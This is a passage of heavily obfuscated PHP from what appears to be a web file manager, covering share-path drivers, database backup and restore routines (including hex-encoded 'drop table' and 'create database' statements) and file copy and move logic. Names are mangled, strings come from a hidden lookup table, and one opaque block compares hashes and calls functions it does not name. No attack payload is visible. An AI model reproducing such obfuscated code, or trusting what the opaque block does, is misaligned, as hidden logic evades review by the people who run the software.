$CÂ¨ŞÁœË­[1165] => array()); } $a·…¹†ÉªÄ = explode($CÂ¨ŞÁœË­[8], trim($eÌŠ„ˆ½èä, $CÂ¨ŞÁœË­[8])); if (count($a·…¹†ÉªÄ) < 2) { show_tips($eÌŠ„ˆ½èä . $CÂ¨ŞÁœË­[1172]); } return array($CÂ¨ŞÁœË­[415] => intval($a·…¹†ÉªÄ[0]), $CÂ¨ŞÁœË­[85] => $a·…¹†ÉªÄ[1], $CÂ¨ŞÁœË­[1165] => array_slice($a·…¹†ÉªÄ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($E’ ¹¢öÄƒ) { $this->pathParse = $E’ ¹¢öÄƒ; $this->model = Model($_SERVER[í¤âËÚ£¶íÊ¢][1164]); } public function getPathOuter($D‚á’éï°É) { $cù²á˜êì =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$D‚á’éï°É) { return $D‚á’éï°É; } $Bàöø¼©„µ = $this->parse($D‚á’éï°É); return trim(KodIO::makeShare($this->pathParse[$cù²á˜êì[397]], $Bàöø¼©„µ[$cù²á˜êì[397]]), $cù²á˜êì[8]); } protected function infoParse($bö„¯çÉ‡õ, $c‡ºÈ™ÌÛ = false, $d”»øòàÆğ = false) { $EĞ¯‰­áÒ° =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÜ•‹öò« = $this->pathParse[$EĞ¯‰­áÒ°[397]]; $B×É—ÀƒÌ¥ = trim($this->pathParse[$EĞ¯‰­áÒ°[1024]], $EĞ¯‰­áÒ°[8]); return Action($EĞ¯‰­áÒ°[1173])->sharePathInfo($CÜ•‹öò«, $B×É—ÀƒÌ¥); } public function infoFull($eã¿…Ğ) { $Eƒ£Ó°¡Êò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bòÎÔŠ²í = explode($Eƒ£Ó°¡Êò[8], trim($eã¿…Ğ, $Eƒ£Ó°¡Êò[8])); if (count($bòÎÔŠ²í) > 1) { $cè¿åÀÀßÈ = implode($Eƒ£Ó°¡Êò[8], array_splice($bòÎÔŠ²í, 1)); $dÎ‡³ÅÒÄ = $this->model->pathInfoByPath($bòÎÔŠ²í[0], $cè¿åÀÀßÈ); if (!$dÎ‡³ÅÒÄ) { return !1; } $this->pathParse[$Eƒ£Ó°¡Êò[1024]] = $dÎ‡³ÅÒÄ[$Eƒ£Ó°¡Êò[399]]; } return $this->infoParse($eã¿…Ğ); } public function listAll($F æ¯‹ğøÏ) { goto AƒËÔîæ’¯; AƒËÔîæ’¯: $F¿—Ô¥ÈóÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¨ çä¬¸ö = IO::info($this->pathParse[$F¿—Ô¥ÈóÍ[85]]); if (!$F¨ çä¬¸ö) { return array(); } goto b®–øÈÁ®…; d¸—Ä½æ°: foreach ($cŸ´ç½Áßã as &$AÁ§¢Êƒ½) { check_abort(); $AÁ§¢Êƒ½[$F¿—Ô¥ÈóÍ[94]] = $a†×Ô†®Æ->_shareItemeParse($AÁ§¢Êƒ½[$F¿—Ô¥ÈóÍ[94]], $CòÕùîÄ¿¬); } unset($AÁ§¢Êƒ½); return $cŸ´ç½Áßã; goto a±‚«‰±¨; b®–øÈÁ®…: $cŸ´ç½Áßã = $this->model->listAll($F æ¯‹ğøÏ); $CòÕùîÄ¿¬ = Model($F¿—Ô¥ÈóÍ[567])->getInfo($F¨ çä¬¸ö[$F¿—Ô¥ÈóÍ[471]]); $a†×Ô†®Æ = Action($F¿—Ô¥ÈóÍ[1173]); goto d¸—Ä½æ°; a±‚«‰±¨: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b¡¬²â¨Ï) { $this->pathParse = $b¡¬²â¨Ï; $this->model = Model($_SERVER[í¤âËÚ£¶íÊ¢][1164]); } protected function infoParse($aÅ´êĞù¹, $dŒâï¹‡´Ÿ = false, $e‹±Ü‹íÈâ = false) { $fÎ¥º¥‘éŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return Action($fÎ¥º¥‘éŞ[1030])->sharePathInfo($this->pathParse[$fÎ¥º¥‘éŞ[85]], !0); } public function listPath($fª¼çé·é¿, $Cå³çğ„‡š = false) { $e÷·£‹çÛ¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¡‰Šä§¸ = parent::listPath($fª¼çé·é¿, $Cå³çğ„‡š); foreach ($F¡‰Šä§¸ as $E²öËÀ¸¯Û => $B£÷»ÃÔÅ‘) { if (!in_array($E²öËÀ¸¯Û, array($e÷·£‹çÛ¼[83], $e÷·£‹çÛ¼[84]))) { continue; } foreach ($B£÷»ÃÔÅ‘ as $fší’ÈôêØ => $DèíÎíÛ—‹) { $F¡‰Šä§¸[$E²öËÀ¸¯Û][$fší’ÈôêØ] = Action($e÷·£‹çÛ¼[1030])->shareItemInfo($DèíÎíÛ—‹); } } return $F¡‰Šä§¸; } public function listAll($fÏãßÜ ¨) { goto f‘ÊòŒ½›; f‘ÊòŒ½›: $DËŸÊğ™õ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cŒñÇùÒ = IO::info($this->pathParse[$DËŸÊğ™õ[85]]); if (!$cŒñÇùÒ) { return array(); } goto e¿âĞë“È¸; eà¯Óê“œç: return $A¦‹¡²Ó¤™; goto EòÛŒ«µŸÀ; e¿âĞë“È¸: $A¦‹¡²Ó¤™ = $this->model->listAll($fÏãßÜ ¨); foreach ($A¦‹¡²Ó¤™ as &$F“åÂ¡Á²¬) { $F“åÂ¡Á²¬[$DËŸÊğ™õ[94]] = Action($DËŸÊğ™õ[1030])->shareItemInfo($F“åÂ¡Á²¬[$DËŸÊğ™õ[94]]); } unset($F“åÂ¡Á²¬); goto eà¯Óê“œç; EòÛŒ«µŸÀ: } } goto CóŒÀƒÖÙÀ; a¡ÃÁŞßÑ: $d±‰†ì­Ñ = $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][57]]; $cÑ½÷±áÚÓ = $_SERVER[í¤âËÚ£¶íÊ¢][58]; if ($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][59]] != $cÑ½÷±áÚÓ($d±‰†ì­Ñ)) { goto eàİâ‚áÃÍ; eàİâ‚áÃÍ: $F†šÚ ˜¿Ï = $_SERVER[í¤âËÚ£¶íÊ¢][60]; $FÇ¹¸Åçôƒ = $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]; $föµ½¾îŒÏ = $F†šÚ ˜¿Ï($FÇ¹¸Åçôƒ); goto c‡½ÃÄ¤¹›; c‡½ÃÄ¤¹›: $eÃ·¿¨æÍ = explode($_SERVER[í¤âËÚ£¶íÊ¢][63], $föµ½¾îŒÏ); if (count($eÃ·¿¨æÍ) < $_SERVER[í¤âËÚ£¶íÊ¢][64]) { $DÁ‘×ïË = $_SERVER[í¤âËÚ£¶íÊ¢][65]; $DÁ‘×ïË(); } $d¾’‰áóÌ = $_SERVER[í¤âËÚ£¶íÊ¢][66]; goto DçËÚåÇÜÌ; DçËÚåÇÜÌ: $d¾’‰áóÌ($d±‰†ì­Ñ); goto dˆ­ÒÆßÆï; dˆ­ÒÆßÆï: } goto DôÒãÓÃÏ; f›ÖÆ²…­‚: class DbManage { function __construct($FÈ„’èŸÁ„, $CŞíØõ­ = '') { $this->database = $FÈ„’èŸÁ„; $this->type = $CŞíØõ­; } public function model($b­°ƒÊ¶ê = '') { return new ModelBase($b­°ƒÊ¶ê, $_SERVER[í¤âËÚ£¶íÊ¢][33], $this->database); } public function db($FˆÚÊÑÉë = false) { goto B£³³„Üò©; B£³³„Üò©: $c·­™‰Ğ¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b’ˆˆ¾œ‡æ = array_change_key_case($this->database); if ($this->type == $c·­™‰Ğ¥[9] || !$FˆÚÊÑÉë) { return $this->model()->db(); } goto EŒ¨Ñ“Š­´; EŒ¨Ñ“Š­´: $E¡¦ÏÜ‘İ = $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[890]]; $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[890]] = $c·­™‰Ğ¥[33]; if ($b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[729]] == $c·­™‰Ğ¥[730]) { $AËƒĞÈ«± = $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[731]]; $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[731]] = substr($AËƒĞÈ«±, 0, strrpos($AËƒĞÈ«±, $c·­™‰Ğ¥[978])); } goto f¿È¾‘ÜŠ“; dŸÒì½‰òë: $this->database = $b’ˆˆ¾œ‡æ; $DÇƒÓ–¬¥->execute("\x75\x73\x65\x20\140{$E¡¦ÏÜ‘İ}\x60"); return $DÇƒÓ–¬¥; goto F˜Œ´øîœİ; f¿È¾‘ÜŠ“: $this->database = $b’ˆˆ¾œ‡æ; $DÇƒÓ–¬¥ = $this->model()->db(); try { $bšòÜºƒÀ‚ = $DÇƒÓ–¬¥->execute("\x73\x68\x6f\x77\x20\144\x61\164\141\142\x61\x73\x65\x73\x20\154\151\x6b\x65\40\47{$E¡¦ÏÜ‘İ}\47"); } catch (Exception $C”ÎÌÁàš) { } goto E¿Î…Ç´ÈØ; E¿Î…Ç´ÈØ: if (!$bšòÜºƒÀ‚) { $DÇƒÓ–¬¥->execute("\x63\162\x65\141\164\x65\40\x64\141\x74\141\142\141\x73\145\x20\140{$E¡¦ÏÜ‘İ}\x60"); } $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[890]] = $E¡¦ÏÜ‘İ; if ($b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[729]] == $c·­™‰Ğ¥[730]) { $b’ˆˆ¾œ‡æ[$c·­™‰Ğ¥[731]] .= $c·­™‰Ğ¥[978] . $E¡¦ÏÜ‘İ; } goto dŸÒì½‰òë; F˜Œ´øîœİ: } public function createTable($bèŸìğ‹ô, $Cè•ŒÇ”Úß = null) { $AïŸ¥æÁ…Ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!IO::exist($bèŸìğ‹ô)) { ActionCall($AïŸ¥æÁ…Ò[979], !0, 0); show_json(LNG($AïŸ¥æÁ…Ò[980]), !1); } $FïÜ‰ÑÑ®Ã = sqlSplit(IO::getContent($bèŸìğ‹ô)); foreach ($FïÜ‰ÑÑ®Ã as $eñ¥†Ö“Á) { if ($Cè•ŒÇ”Úß) { $A¦Ë°çó²‡ = stripos($eñ¥†Ö“Á, $AïŸ¥æÁ…Ò[981]) === 0; if ($A¦Ë°çó²‡) { $Cè•ŒÇ”Úß->task[$AïŸ¥æÁ…Ò[982]] += 1; } } $this->model()->db()->execute($eñ¥†Ö“Á); if ($Cè•ŒÇ”Úß && $A¦Ë°çó²‡) { preg_match($AïŸ¥æÁ…Ò[983], $eñ¥†Ö“Á, $Dî‹İëƒù); $Cè•ŒÇ”Úß->task[$AïŸ¥æÁ…Ò[984]] = $Dî‹İëƒù[1]; $Cè•ŒÇ”Úß->update(1); } } $this->taskToCache($Cè•ŒÇ”Úß); } public function insertTable($fÚ¬£Ëœ£ö, $aÁ°Š†ÚÜ = null) { $càº‹á²° =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D´ŒÍÓÅŒØ = $this->model()->db(); $e­– ÆÍõï = $f°æ„Õôöø ? array($f°æ„Õôöø) : $D´ŒÍÓÅŒØ->getTables(); foreach ($fÚ¬£Ëœ£ö as $còã›ŸˆÈ) { $f°æ„Õôöø = basename($còã›ŸˆÈ, $càº‹á²°[722]); if (!in_array($f°æ„Õôöø, $e­– ÆÍõï)) { continue; } if ($aÁ°Š†ÚÜ) { $aÁ°Š†ÚÜ->task[$càº‹á²°[984]] = $f°æ„Õôöø; } if (get_filesize($còã›ŸˆÈ) == 0) { continue; } $DâóŠ¤ÈØš = $this->sqlToDb($còã›ŸˆÈ, $aÁ°Š†ÚÜ); if (!$DâóŠ¤ÈØš) { ActionCall($càº‹á²°[979], !0, 0); show_json(LNG($càº‹á²°[985]) . "\x5b{$f°æ„Õôöø}\x5d", !1); } } $this->taskToCache($aÁ°Š†ÚÜ); } public function sqlFromDb($EœÆ‡„ËĞê, $eáì‘±ìáí, $fù‚¤ÊÑ² = null, $c—©·èØš£ = null) { goto D½ÌØù½Øò; döÃ—‡ÓŠŸ: fclose($e°œäõò£ê); return $dìå‘§°ò„; goto e”ê¦Éƒ…‚; D½ÌØù½Øò: if ($fù‚¤ÊÑ²) { $fù‚¤ÊÑ²->task[$_SERVER[í¤âËÚ£¶íÊ¢][984]] = $EœÆ‡„ËĞê; } $aÃ‰÷Ç‹ñ = $this->model($EœÆ‡„ËĞê); $dìå‘§°ò„ = 0; goto eÖ¤£¶Œ´„; AÄš¨‡›ä†: $e½ÇÄ¾×È = $aÃ‰÷Ç‹ñ->getPk(); $A‹ãäŸØßà = $aÃ‰÷Ç‹ñ->getDbFields(); do { $Cõ¦Ëê‚²ö = $aÃ‰÷Ç‹ñ->field($A‹ãäŸØßà)->order($e½ÇÄ¾×È . $_SERVER[í¤âËÚ£¶íÊ¢][987])->selectPage($eï¶„ç‹¬Ü, $Cç¨è½±·Ø); $aæÈÈ°ÈìŠ = isset($Cõ¦Ëê‚²ö[$_SERVER[í¤âËÚ£¶íÊ¢][372]][$_SERVER[í¤âËÚ£¶íÊ¢][374]]) ? $Cõ¦Ëê‚²ö[$_SERVER[í¤âËÚ£¶íÊ¢][372]][$_SERVER[í¤âËÚ£¶íÊ¢][374]] : 0; $b¦ÇªŸÃªÓ = !empty($Cõ¦Ëê‚²ö[$_SERVER[í¤âËÚ£¶íÊ¢][375]]) ? $Cõ¦Ëê‚²ö[$_SERVER[í¤âËÚ£¶íÊ¢][375]] : array(); if (!($EĞ…®³×ÃĞ = count($b¦ÇªŸÃªÓ))) { break; } $Aì„›ùò´§ = array(); foreach ($b¦ÇªŸÃªÓ as $eöó¿ÙÈèª) { if ($EœÆ‡„ËĞê == $_SERVER[í¤âËÚ£¶íÊ¢][988] && $eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][29]] == $_SERVER[í¤âËÚ£¶íÊ¢][989]) { $A…¨‹‚ÌŠ = json_decode($eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][380]], !0); if ($A…¨‹‚ÌŠ[$_SERVER[í¤âËÚ£¶íÊ¢][28]] == date($_SERVER[í¤âËÚ£¶íÊ¢][695]) && !$A…¨‹‚ÌŠ[$_SERVER[í¤âËÚ£¶íÊ¢][694]]) { continue; } } if ($c—©·èØš£) { $eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][85]] = "\173\151\x6f\x3a{$c—©·èØš£}\175" . substr($eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][85]], strlen("\173\151\157\x3a{$eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][752]]}\175")); $eöó¿ÙÈèª[$_SERVER[í¤âËÚ£¶íÊ¢][752]] = $c—©·èØš£; } $Aì„›ùò´§[] = $_SERVER[í¤âËÚ£¶íÊ¢][990] . $this->sqlEncode($eöó¿ÙÈèª) . $_SERVER[í¤âËÚ£¶íÊ¢][991]; } $b¢øÖ·¶¾‰ = "\x49\116\x53\x45\x52\124\40\111\x4e\x54\117\40\x60{$EœÆ‡„ËĞê}\x60\40\50\140" . implode($_SERVER[í¤âËÚ£¶íÊ¢][992], $A‹ãäŸØßà) . $_SERVER[í¤âËÚ£¶íÊ¢][993]; fwrite($e°œäõò£ê, $b¢øÖ·¶¾‰ . implode($_SERVER[í¤âËÚ£¶íÊ¢][994], $Aì„›ùò´§) . $_SERVER[í¤âËÚ£¶íÊ¢][77] . PHP_EOL); $Cç¨è½±·Ø++; $dìå‘§°ò„ += $EĞ…®³×ÃĞ; if ($fù‚¤ÊÑ²) { $fù‚¤ÊÑ²->update($EĞ…®³×ÃĞ); } } while ($Cç¨è½±·Ø <= $aæÈÈ°ÈìŠ); goto döÃ—‡ÓŠŸ; eÖ¤£¶Œ´„: $Cç¨è½±·Ø = 1; $eï¶„ç‹¬Ü = 500; $e°œäõò£ê = fopen($eáì‘±ìáí, $_SERVER[í¤âËÚ£¶íÊ¢][986]); goto AÄš¨‡›ä†; e”ê¦Éƒ…‚: } public function sqlToDb($E³·•Ğ¨›ª, $F™Š¥Ÿˆ¦’ = null) { goto CÙÚÂâÃÕá; C¨ŞÏ÷‰Â¤: $b¸ÏçïªŞ = 500 + 1; while (!feof($dµøÂìçåÅ)) { if ($F™Š¥Ÿˆ¦’ && $D©—Û‰Ó – != 0) { $F™Š¥Ÿˆ¦’->task[$aæ‚‹ò È[982]] += 1; } $D©—Û‰Ó –++; $b…ÁÇ¨Æ´± = trim(fgets($dµøÂìçåÅ)); $E†˜ğÈ½†Ê .= $aæ‚‹ò È[50] . $this->sqlDecode($b…ÁÇ¨Æ´±, $this->type); if ($D©—Û‰Ó – == $b¸ÏçïªŞ) { $E†˜ğÈ½†Ê = rtrim(trim($E†˜ğÈ½†Ê), $aæ‚‹ò È[77]); if (!$CåÅ¼Öâ->execute($E†˜ğÈ½†Ê)) { return !1; } if ($F™Š¥Ÿˆ¦’) { $F™Š¥Ÿˆ¦’->update($D©—Û‰Ó – - 1); } $E†˜ğÈ½†Ê = $aæ‚‹ò È[33]; $D©—Û‰Ó – = 0; } } fclose($dµøÂìçåÅ); goto C¦§Ò”¡ä‡; CÙÚÂâÃÕá: $aæ‚‹ò È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CåÅ¼Öâ = $this->model()->db(); $dµøÂìçåÅ = @fopen($E³·•Ğ¨›ª, $aæ‚‹ò È[995]); goto BÇ†ŠËøÁ‘; C¦§Ò”¡ä‡: if (trim($E†˜ğÈ½†Ê)) { $E†˜ğÈ½†Ê = rtrim(trim($E†˜ğÈ½†Ê), $aæ‚‹ò È[77]); if (!$CåÅ¼Öâ->execute($E†˜ğÈ½†Ê)) { return !1; } if ($F™Š¥Ÿˆ¦’) { $F™Š¥Ÿˆ¦’->update($D©—Û‰Ó – - 1); } } return !0; goto eùŠÑó›â¦; BÇ†ŠËøÁ‘: if (!$dµøÂìçåÅ) { return !1; } $D©—Û‰Ó – = 0; $E†˜ğÈ½†Ê = $aæ‚‹ò È[33]; goto C¨ŞÏ÷‰Â¤; eùŠÑó›â¦: } public function dropTable($cÆ¢„¦‰÷ = null) { $Dõ¯ÉŒ‡Ÿã = $this->model()->db(); $BÀÊö¾ƒÂ = $cÆ¢„¦‰÷ ? array($cÆ¢„¦‰÷) : $Dõ¯ÉŒ‡Ÿã->getTables(); if (!$BÀÊö¾ƒÂ) { return; } foreach ($BÀÊö¾ƒÂ as $cÆ¢„¦‰÷) { $Dõ¯ÉŒ‡Ÿã->execute("\x64\162\x6f\x70\x20\x74\x61\x62\154\x65\40\151\x66\x20\x65\x78\151\x73\164\163\40\x60{$cÆ¢„¦‰÷}\x60"); } } private function taskToCache($aí¾“—Í×¶ = null) { $dæ¸¡…Â„À =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$aí¾“—Í×¶) { return; } $Aš’ìæŒ• = array($dæ¸¡…Â„À[984] => $aí¾“—Í×¶->task[$dæ¸¡…Â„À[984]], $dæ¸¡…Â„À[982] => $aí¾“—Í×¶->task[$dæ¸¡…Â„À[982]], $dæ¸¡…Â„À[996] => $aí¾“—Í×¶->task[$dæ¸¡…Â„À[996]]); if ($Aš’ìæŒ•[$dæ¸¡…Â„À[982]] == $Aš’ìæŒ•[$dæ¸¡…Â„À[996]]) { $Aš’ìæŒ•[$dæ¸¡…Â„À[701]] = 1; } Cache::set($dæ¸¡…Â„À[997] . $aí¾“—Í×¶->task[$dæ¸¡…Â„À[397]], $Aš’ìæŒ•); $aí¾“—Í×¶->end(); } private function sqlEncode($BÅ©øé¯´) { $Dˆöâ¸©ì‹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¬§º³†Ò¢ = array(); foreach ($BÅ©øé¯´ as $bâ›º¯®´Œ) { if (is_array($bâ›º¯®´Œ)) { $bâ›º¯®´Œ = json_encode_force($bâ›º¯®´Œ); } $bâ›º¯®´Œ = addslashes($bâ›º¯®´Œ); $bâ›º¯®´Œ = str_replace(array($Dˆöâ¸©ì‹[998], $Dˆöâ¸©ì‹[63]), array($Dˆöâ¸©ì‹[999], $Dˆöâ¸©ì‹[1000]), $bâ›º¯®´Œ); $c¬§º³†Ò¢[] = str_replace($Dˆöâ¸©ì‹[55], $Dˆöâ¸©ì‹[1001], $bâ›º¯®´Œ); } return $Dˆöâ¸©ì‹[55] . implode($Dˆöâ¸©ì‹[1002], $c¬§º³†Ò¢) . $Dˆöâ¸©ì‹[55]; } private function sqlDecode($E“«„®Ä¦, $B¶×õ ƒœ§) { $Fä¿‡„¡Ï =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E“«„®Ä¦ = str_replace(array($Fä¿‡„¡Ï[999], $Fä¿‡„¡Ï[1000]), array($Fä¿‡„¡Ï[998], $Fä¿‡„¡Ï[63]), $E“«„®Ä¦); if ($B¶×õ ƒœ§ == $Fä¿‡„¡Ï[9]) { $E“«„®Ä¦ = stripslashes($E“«„®Ä¦); } return $E“«„®Ä¦; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($E•ñÀø†±˜, $eª‡Äè‰‡) { goto añ¼İ¶ì¨ï; añ¼İ¶ì¨ï: $bğ‹†ŞáÓÇ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dïÖ¥Òñ¨ = $eª‡Äè‰‡; $GLOBALS[$bğ‹†ŞáÓÇ[1003]] = $bğ‹†ŞáÓÇ[1004] . $E•ñÀø†±˜; goto DõÀ­ÊÅÓÑ; D£ØÙÔÁ†: Hook::trigger($bğ‹†ŞáÓÇ[1004] . $E•ñÀø†±˜ . $bğ‹†ŞáÓÇ[1007], $dïÖ¥Òñ¨, $Fé³î¶’ô); return $Fé³î¶’ô; goto f¨×ÀÒ´Ï£; DõÀ­ÊÅÓÑ: Hook::trigger($bğ‹†ŞáÓÇ[1004] . $E•ñÀø†±˜ . $bğ‹†ŞáÓÇ[1005], $dïÖ¥Òñ¨); $C¥¶ ƒÜÃì = self::driverMake($eª‡Äè‰‡[0]); if (method_exists($C¥¶ ƒÜÃì, $E•ñÀø†±˜)) { $Fé³î¶’ô = @call_user_func_array(array($C¥¶ ƒÜÃì, $E•ñÀø†±˜), $eª‡Äè‰‡); } else { if (method_exists($C¥¶ ƒÜÃì, $bğ‹†ŞáÓÇ[1006])) { $Fé³î¶’ô = @call_user_func_array(array($C¥¶ ƒÜÃì, $E•ñÀø†±˜), $eª‡Äè‰‡); } else { if (method_exists(self, $E•ñÀø†±˜)) { $Fé³î¶’ô = @call_user_func_array(array(self, $E•ñÀø†±˜), $eª‡Äè‰‡); } else { $Fé³î¶’ô = call_user_func_array(array(parent, $E•ñÀø†±˜), $eª‡Äè‰‡); } } } goto D£ØÙÔÁ†; f¨×ÀÒ´Ï£: } public static function init($b‡Œ¢Åæ„®) { return self::driverMake($b‡Œ¢Åæ„®); } public static function copy($bæ½‡øèÊ, $fæ½óù™Ùº, $c²±°Ş¯ìÁ = false, $fëŒÒ‘è = false) { return self::copyMoveStart($bæ½‡øèÊ, $fæ½óù™Ùº, $c²±°Ş¯ìÁ, $_SERVER[í¤âËÚ£¶íÊ¢][522], $fëŒÒ‘è); } public static function move($eÇ——ßµ, $BêÔ„›ÓŠÎ, $Bğ’£‡‰Å = false, $bŞîÉ×ÊëÆ = false) { return self::copyMoveStart($eÇ——ßµ, $BêÔ„›ÓŠÎ, $Bğ’£‡‰Å, $_SERVER[í¤âËÚ£¶íÊ¢][524], $bŞîÉ×ÊëÆ); } private static function copyMoveStart($DŒšé§»ø¾, $Dã¿ó†œ¼, $a£¤¤†ñƒ£, $BêÃšÑ’¶¿, $có„’ÕÄ™) { $A„ŸŠæÊà =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¯éğš„ó‹ = array($DŒšé§»ø¾, $Dã¿ó†œ¼, $a£¤¤†ñƒ£, $có„’ÕÄ™); Hook::trigger($A„ŸŠæÊà[1004] . $BêÃšÑ’¶¿ . $A„ŸŠæÊà[1005], $A¯éğš„ó‹); $EŸŒŸîÙè = self::copyMove($DŒšé§»ø¾, $Dã¿ó†œ¼, $a£¤¤†ñƒ£, $BêÃšÑ’¶¿, $có„’ÕÄ™); Hook::trigger($A„ŸŠæÊà[1004] . $BêÃšÑ’¶¿ . $A„ŸŠæÊà[1007], $A¯éğš„ó‹, $EŸŒŸîÙè); return $EŸŒŸîÙè; } public static function saveFile($D‡¸éùÒ¸­, $C¾İÒîä, $bÄá‚İšµ… = true) { goto F×©Ã—„â; CÁù¶£º©: $aÑİÜ¨Ê­• = $EÚÈ ¦’«Ğ->pathFather($C¾İÒîä); $c© Ô‡öã­ = !0; if (!$bÄá‚İšµ… && self::driverIsSame($AƒÎõ…İ§, $EÚÈ ¦’«Ğ)) { $c© Ô‡öã­ = !1; } goto DïùÈ‰îÜÈ; F×©Ã—„â: $FİŞ•”Û­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BŠÈñ‘µè = self::info($C¾İÒîä); $AƒÎõ…İ§ = self::driverMake($D‡¸éùÒ¸­); goto A„£— ‹©; A„£— ‹©: $EÚÈ ¦’«Ğ = self::driverMake($C¾İÒîä); $BÃ™‡¢Åßê = !1; if ($EÚÈ ¦’«Ğ->pathParse[$FİŞ•”Û­[1008]]) { $FæÓÒ§ÎŠ› = $EÚÈ ¦’«Ğ->pathParse[$FİŞ•”Û­[1008]]; $BÃ™‡¢Åßê = $EÚÈ ¦’«Ğ; $EÚÈ ¦’«Ğ = self::driverMake($FæÓÒ§ÎŠ›); } goto CÁù¶£º©; DïùÈ‰îÜÈ: $A‘ÔÌÙÖ¸ò = self::copyFile($AƒÎõ…İ§, $D‡¸éùÒ¸­, $EÚÈ ¦’«Ğ, $aÑİÜ¨Ê­•, $BŠÈñ‘µè[$FİŞ•”Û­[28]], $c© Ô‡öã­); if ($BÃ™‡¢Åßê) { $A‘ÔÌÙÖ¸ò = $BÃ™‡¢Åßê->getPathOuter($A‘ÔÌÙÖ¸ò); } return $A‘ÔÌÙÖ¸ò; goto FÖË°¬Üµ³; FÖË°¬Üµ³: } private static function copyMove($bÑ‰âŠŠŒ«, $Cî¨¡…ÙŸ, $AÅŸÄ‚¬à, $EÅ»š•Ñ, $a®ë•¨õÇ‡ = false) { goto b ª©¨ìÊ¦; b ª©¨ìÊ¦: $c†èšÌã‹³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$bÑ‰âŠŠŒ« || $bÑ‰âŠŠŒ« == $c†èšÌã‹³[8] || !$Cî¨¡…ÙŸ) { return !1; } ignore_timeout(); goto EÊËäƒãØ†; EÊËäƒãØ†: $Eîä¯Øâ‚ = self::driverMake($bÑ‰âŠŠŒ«); $Eöõô˜Ø°… = self::driverMake($Cî¨¡…ÙŸ); $EÒ„ğä«Î = $EÅ»š•Ñ == $c†èšÌã‹³[524]; goto F†©µ´Ú¸ç; dæ­ƒ·‘¼: $B¯ÉŸË…ßÛ = $Eîä¯Øâ‚->isFile($bÑ‰âŠŠŒ«); if (!$B¯ÉŸË…ßÛ && $Eöõô˜Ø°…->getType() == $c†èšÌã‹³[699] && $Eîä¯Øâ‚->getType() == $c†èšÌã‹³[115]) { $E è•¾¯÷© = $Eöõô˜Ø°…->copyFolderFromIO($Eîä¯Øâ‚, $bÑ‰âŠŠŒ«, $Cî¨¡…ÙŸ, $AÅŸÄ‚¬à, $EÒ„ğä«Î, $a®ë•¨õÇ‡); } else { $E è•¾¯÷© = self::copyPath($Eîä¯Øâ‚, $bÑ‰âŠŠŒ«, $Eöõô˜Ø°…, $Cî¨¡…ÙŸ, $AÅŸÄ‚¬à, $EÒ„ğä«Î, $B¯ÉŸË…ßÛ, $a®ë•¨õÇ‡); } if ($E è•¾¯÷© && $EÒ„ğä«Î) { $Eîä¯Øâ‚->remove($bÑ‰âŠŠŒ«); } goto f²ŒÃ¥¡©; F†©µ´Ú¸ç: $D…ÂŸ©†Í = !1; if ($Eöõô˜Ø°…->pathParse[$c†èšÌã‹³[1008]]) { $Cî¨¡…ÙŸ = $Eöõô˜Ø°…->pathParse[$c†èšÌã‹³[1008]]; $D…ÂŸ©†Í = $Eöõô˜Ø°…; $Eöõô˜Ø°… = self::driverMake($Cî¨¡…ÙŸ); } self::check($Eîä¯Øâ‚, $bÑ‰âŠŠŒ«, $Eöõô˜Ø°…, $Cî¨¡…ÙŸ); goto Bè·¹‚¢Ö; Bè·¹‚¢Ö: Hook::trigger($c†èšÌã‹³[82], $Eîä¯Øâ‚, $bÑ‰âŠŠŒ«, $Eöõô˜Ø°…, $Cî¨¡…ÙŸ); $bïÆºã¨ä = self::driverIsSame($Eîä¯Øâ‚, $Eöõô˜Ø°…); if ($bïÆºã¨ä) { if ($EÅ»š•Ñ == $c†èšÌã‹³[524] && !method_exists($Eöõô˜Ø°…, $c†èšÌã‹³[1009]) && trim($Cî¨¡…ÙŸ, $c†èšÌã‹³[8]) == trim($Eöõô˜Ø°…->pathFather($bÑ‰âŠŠŒ«), $c†èšÌã‹³[8])) { if ($Eîä¯Øâ‚->pathThis($bÑ‰âŠŠŒ«) != $a®ë•¨õÇ‡ && !$Eîä¯Øâ‚->isTypeObject()) { return $Eîä¯Øâ‚->rename($bÑ‰âŠŠŒ«, $a®ë•¨õÇ‡); } return $Eöõô˜Ø°…->getPathOuter($bÑ‰âŠŠŒ«); } if (method_exists($Eöõô˜Ø°…, $EÅ»š•Ñ)) { return $Eöõô˜Ø°…->{$EÅ»š•Ñ}($bÑ‰âŠŠŒ«, 